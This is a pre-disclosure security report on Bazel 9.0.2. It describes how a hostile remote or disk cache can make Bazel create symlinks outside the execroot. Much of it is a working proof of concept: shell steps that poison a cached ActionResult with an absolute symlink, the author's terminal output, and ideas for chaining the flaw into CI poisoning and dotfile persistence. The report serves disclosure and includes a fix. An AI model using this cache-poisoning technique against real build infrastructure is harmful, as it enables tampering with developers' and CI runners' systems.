
# Bazel Remote Cache: Symlink Escape via Unvalidated ActionResult Output Paths

**Product:** Bazel (bazelbuild/bazel)  
**Affected Version:** Confirmed on 9.0.2 (current stable as of April 2026)  
**Severity:** Medium–High (dependent on deployment context)  
**Class:** Path Confinement Bypass / Arbitrary Symlink Write  
**Reporter:** Keshav Goyal  
**Status:** Unreported (pre-disclosure)

---

## A. Vulnerability Summary

A malicious remote cache or remote execution service can make Bazel create attacker-chosen symlinks **outside the execroot**, because remote `ActionResult` output paths are trusted and materialized without confinement checks.

This allows an attacker who controls a remote cache, remote executor, or a shared disk cache to write symlinks to arbitrary filesystem locations writable by the Bazel user.

---

## B. Root Cause

### `RemotePathResolver.outputPathToLocalPath()` — no absolute-path rejection

```
RemotePathResolver.java, line 105
```

`execRoot.getRelative(outputPath)` is called unconditionally. On most path implementations, `getRelative()` with an **absolute** argument returns the argument itself, discarding the base entirely. There is no check that the result is still under `execRoot`.

### `parseActionResultMetadata()` — symlink paths accepted verbatim from the server

```
RemoteExecutionService.java, line 1174   (top-level OutputSymlink.path)
RemoteExecutionService.java, line 1073   (symlink names inside returned Tree objects)
```

Both code sites pass server-supplied paths directly to `createSymlinks()` with no `startsWith(execRoot)` assertion and no relative-path validation.

### `createSymlinks()` — writes to disk without confinement

```
RemoteExecutionService.java, line 931
```

The method accepts and acts on whatever path it is handed, creating the symlink on disk with no further validation.

### The REAPI spec requires relative paths

The bundled Remote Execution API proto explicitly mandates:

| Field | Constraint | Location |
|---|---|---|
| `OutputFile.path` | Relative, must not start with `/` | `remote_execution.proto:1357` |
| `OutputDirectory.path` | Relative | `remote_execution.proto:1403` |
| `OutputSymlink.path` | Relative | `remote_execution.proto:1469` |
| `Directory` child names | Exactly one path segment | `remote_execution.proto:906` |

Bazel's own `BazelOutputService.java` (line 148) validates analogous path data on the output service side. The missing checks in the remote cache materialization path are therefore **accidental omissions, not a design choice**.

---

## C. Real-World Impact

An attacker controlling a remote cache, remote executor, or a poisoned shared disk cache can:

- Create symlinks **outside the workspace** and outside `bazel-out`
- Plant symlinks into `/tmp`, home-directory dotfiles, CI working directories, or any other user-writable path
- Use planted symlinks for:
  - **Persistence** — e.g. pointing `~/.bashrc` or a CI credential file at attacker-controlled content
  - **Sabotage** — breaking downstream tooling that trusts filesystem state
  - **Exploit chaining** — serving as a prerequisite step toward code execution or sensitive file exposure via tools that follow symlinks

If Bazel runs with elevated privileges (e.g. in a CI runner with broad filesystem access), severity increases sharply.

---

## D. Proof of Concept

The following was confirmed on **Bazel 9.0.2**, Linux, using a disk cache as a stand-in for a hostile remote cache. The disk cache exercises the same `ActionResult` parsing and materialization path.

### Step 1 — Install Bazel via Bazelisk

```bash
curl -L https://github.com/bazelbuild/bazelisk/releases/download/v1.21.0/bazelisk-linux-amd64 -o /tmp/bazel
chmod +x /tmp/bazel
/tmp/bazel --version

# bazel 9.0.2
```

### Step 2 — Create a minimal workspace

```bash
mkdir -p /tmp/bazel-repro

cat > /tmp/bazel-repro/MODULE.bazel <<'EOF'
module(name = "bazel_repro")
EOF

cat > /tmp/bazel-repro/BUILD <<'EOF'
genrule(
    name = "poc",
    outs = ["ok.txt"],
    cmd = "echo ok > $@",
)
EOF
```

### Step 3 — Prime a clean disk cache

```bash
rm -rf /tmp/bazel-repro-cache /tmp/bazel-repro-ob /tmp/bazel-repro-home
mkdir -p /tmp/bazel-repro-home
cd /tmp/bazel-repro

HOME=/tmp/bazel-repro-home /tmp/bazel \
  --output_base=/tmp/bazel-repro-ob \
  build --disk_cache=/tmp/bazel-repro-cache //:poc
```

### Step 4 — Create a minimal REAPI proto for encoding/decoding

```bash
cat > /tmp/reapi_min.proto <<'EOF'
syntax = "proto3";
package build.bazel.remote.execution.v2;
message Digest { string hash = 1; int64 size_bytes = 2; }
message OutputFile { string path = 1; Digest digest = 2; bool is_executable = 4; bytes contents = 5; }
message OutputSymlink { string path = 1; string target = 2; }
message ActionResult { reserved 1; repeated OutputFile output_files = 2; repeated OutputSymlink output_symlinks = 12; }
EOF
```

### Step 5 — Decode the cached ActionResult and record the output file hash

```bash
AC=$(find /tmp/bazel-repro-cache/ac -type f | head -n1)
protoc -I /tmp --decode=build.bazel.remote.execution.v2.ActionResult \
  /tmp/reapi_min.proto < "$AC"
```

Example output (hash will vary):

```
output_files {
  path: "bazel-out/k8-fastbuild/bin/ok.txt"
  digest {
    hash: "dc51b8c96c2d745df3bd5590d990230a482fd247123599548e0632fdbf97fc22"
    size_bytes: 3
  }
  is_executable: true
}
```

### Step 6 — Poison the cached ActionResult with a malicious symlink

Substitute the real hash from Step 5:

```bash
cat > /tmp/malicious_action_result.textproto <<'EOF'
output_files {
  path: "bazel-out/k8-fastbuild/bin/ok.txt"
  digest {
    hash: "dc51b8c96c2d745df3bd5590d990230a482fd247123599548e0632fdbf97fc22" ## REPLACE THE HASH HERE
    size_bytes: 3
  }
  is_executable: true
}
output_symlinks {
  path: "/tmp/bazel-owned-link"
  target: "/etc/passwd"
}
EOF

protoc -I /tmp --encode=build.bazel.remote.execution.v2.ActionResult \
  /tmp/reapi_min.proto \
  < /tmp/malicious_action_result.textproto > "$AC"
```

### Step 7 — Rebuild from the poisoned cache

```bash
rm -f /tmp/bazel-owned-link

HOME=/tmp/bazel-repro-home /tmp/bazel \
  --output_base=/tmp/bazel-repro-ob \
  build --disk_cache=/tmp/bazel-repro-cache //:poc
```

### Step 8 — Verify

```bash
ls -l /tmp/bazel-owned-link
readlink /tmp/bazel-owned-link
```

### Confirmed output

```
INFO: 2 processes: 1 disk cache hit, 1 internal.
INFO: Build completed successfully, 2 total actions

lrwxrwxrwx 1 keshavgoyal Grads 11 Apr 12 17:28 /tmp/bazel-owned-link -> /etc/passwd
/etc/passwd
```

- The build **succeeds** and reports a cache hit
- `/tmp/bazel-owned-link` exists **outside the execroot**
- It points to `/etc/passwd`
- No warnings or errors are emitted

---

## E. Exploit Chain Possibilities

This primitive becomes more dangerous when combined with:

| Vector | Effect |
|---|---|
| Shared remote cache in CI | All developers/runners consuming the cache are affected |
| Attacker-controlled remote executor | Every poisoned build materializes arbitrary symlinks |
| Writable home-directory startup files | Symlink planted at `~/.bashrc`, `~/.profile`, `~/.ssh/authorized_keys`, etc. |
| Downstream tooling that follows symlinks | File reads, writes, or executions redirected through planted link |
| Bazel running with elevated privileges | Write primitive extends to any path on the system |

The most realistic exploitation scenario in practice is **CI environment poisoning**: an attacker with write access to a shared disk cache or remote cache service poisons a high-frequency build action, causing every subsequent build to plant symlinks in developer or runner environments silently.

---

## F. Fix Recommendation

Before materializing any remote output, Bazel should:

1. **Reject absolute paths** — `OutputFile.path`, `OutputDirectory.path`, and `OutputSymlink.path` must not start with `/`. Reject and fail the cache hit if they do.

2. **Reject path-escaping traversals** — Any path component containing `..` or resolving outside `execRoot` after normalization must be rejected.

3. **Reject undeclared extra outputs** — If the server returns outputs not in the declared output list, they should be ignored or cause the action result to be treated as invalid.

4. **Reject multi-segment `Directory` child names** — Tree child names must be exactly one path segment as the REAPI spec requires.

5. **Optionally enforce capability negotiation** — Before creating absolute-target symlinks, check the `absolute_symlink_paths` capability flag per the REAPI spec.

A minimal defensive guard in `parseActionResultMetadata()` before any call into `createSymlinks()`:

```java
if (path.startsWith("/") || path.contains("..")) {
    throw new IOException(
        "Remote ActionResult contains invalid output path: " + path);
}
Path resolved = execRoot.getRelative(path);
if (!resolved.startsWith(execRoot)) {
    throw new IOException(
        "Remote ActionResult output path escapes execRoot: " + path);
}
```




My terminal output for reference:

```bash
[keshavgoyal@hackberry bazel]$ curl -L https://github.com/bazelbuild/bazelisk/releases/download/v1.21.0/bazelisk-linux-amd64 -o /tmp/bazel
chmod +x /tmp/bazel
/tmp/bazel --version
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100 5828k  100 5828k    0     0  7559k      0 --:--:-- --:--:-- --:--:-- 23.2M
bazel 9.0.2


[keshavgoyal@hackberry bazel]$ mkdir -p /tmp/bazel-repro
cat > /tmp/bazel-repro/MODULE.bazel <<'EOF'
module(name = "bazel_repro")
EOF
cat > /tmp/bazel-repro/BUILD <<'EOF'
genrule(
    name = "poc",
    outs = ["ok.txt"],
    cmd = "echo ok > $@",
)
EOF



[keshavgoyal@hackberry bazel]$ rm -rf /tmp/bazel-repro-cache /tmp/bazel-repro-ob /tmp/bazel-repro-home
mkdir -p /tmp/bazel-repro-home
cd /tmp/bazel-repro
HOME=/tmp/bazel-repro-home /tmp/bazel --output_base=/tmp/bazel-repro-ob build --disk_cache=/tmp/bazel-repro-cache //:poc
2026/04/12 17:25:54 Downloading https://releases.bazel.build/9.0.2/release/bazel-9.0.2-linux-x86_64...
Downloading: 62 MB out of 62 MB (100%) 
Extracting Bazel installation...
Starting local Bazel server (9.0.2) and connecting to it...
INFO: Invocation ID: ae5e9ece-7df5-4025-9910-d04568928a31
INFO: Analyzed target //:poc (6 packages loaded, 8 targets configured).
INFO: From Executing genrule //:poc:
/bin/bash: line 1: external/bazel_tools/tools/genrule/genrule-setup.sh: No such file or directory
INFO: Found 1 target...
Target //:poc up-to-date:
  bazel-bin/ok.txt
INFO: Elapsed time: 4.931s, Critical Path: 0.08s
INFO: 2 processes: 1 internal, 1 linux-sandbox.
INFO: Build completed successfully, 2 total actions
[keshavgoyal@hackberry bazel-repro]$ cat > /tmp/reapi_min.proto <<'EOF'
syntax = "proto3";
package build.bazel.remote.execution.v2;
message Digest { string hash = 1; int64 size_bytes = 2; }
message OutputFile { string path = 1; Digest digest = 2; bool is_executable = 4; bytes contents = 5; }
message OutputSymlink { string path = 1; string target = 2; }
message ActionResult { reserved 1; repeated OutputFile output_files = 2; repeated OutputSymlink output_symlinks = 12; }
EOF



[keshavgoyal@hackberry bazel-repro]$ AC=$(find /tmp/bazel-repro-cache/ac -type f | head -n1)
protoc -I /tmp --decode=build.bazel.remote.execution.v2.ActionResult /tmp/reapi_min.proto < "$AC"
output_files {
  path: "bazel-out/k8-fastbuild/bin/ok.txt"
  digest {
    hash: "dc51b8c96c2d745df3bd5590d990230a482fd247123599548e0632fdbf97fc22"
    size_bytes: 3
  }
  is_executable: true
}
6 {
  1: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
}
8 {
  1: "2a37cfd45e71e1d094542d3cf47ff8adcd63bf6c4ad85c65662d60f73af80328"
  2: 98
}
9 {
  3 {
    1: 1776029161
    2: 218914530
  }
  4 {
    1: 1776029161
    2: 225914530
  }
  7 {
    1: 1776029161
    2: 218914530
  }
  8 {
    1: 1776029161
    2: 225914530
  }
}


[keshavgoyal@hackberry bazel-repro]$ rm -rf /tmp/bazel-repro-ob2
rm -f /tmp/bazel-owned-link

cat > /tmp/malicious_action_result.textproto <<'EOF'
output_files {
  path: "bazel-out/k8-fastbuild/bin/ok.txt"
  digest {
    hash: "dc51b8c96c2d745df3bd5590d990230a482fd247123599548e0632fdbf97fc22"
    size_bytes: 3
  }
  is_executable: true
}
output_symlinks {
  path: "/tmp/bazel-owned-link"
  target: "/etc/passwd"
}
EOF

protoc -I /tmp --encode=build.bazel.remote.execution.v2.ActionResult /tmp/reapi_min.proto \
  < /tmp/malicious_action_result.textproto > "$AC"

HOME=/tmp/bazel-repro-home /tmp/bazel \
  build --disk_cache=/tmp/bazel-repro-cache //:poc
Starting local Bazel server (9.0.2) and connecting to it...
INFO: Invocation ID: 7ce6d3fb-66c5-4fad-998f-e5d9539c58d8
INFO: Analyzed target //:poc (6 packages loaded, 8 targets configured).
INFO: Found 1 target...
Target //:poc up-to-date:
  bazel-bin/ok.txt
INFO: Elapsed time: 2.689s, Critical Path: 0.08s
INFO: 2 processes: 1 disk cache hit, 1 internal.
INFO: Build completed successfully, 2 total actions


[keshavgoyal@hackberry bazel-repro]$ ls -l /tmp/bazel-owned-link
readlink /tmp/bazel-owned-link
lrwxrwxrwx 1 keshavgoyal Grads 11 Apr 12 17:28 /tmp/bazel-owned-link -> /etc/passwd
/etc/passwd
```
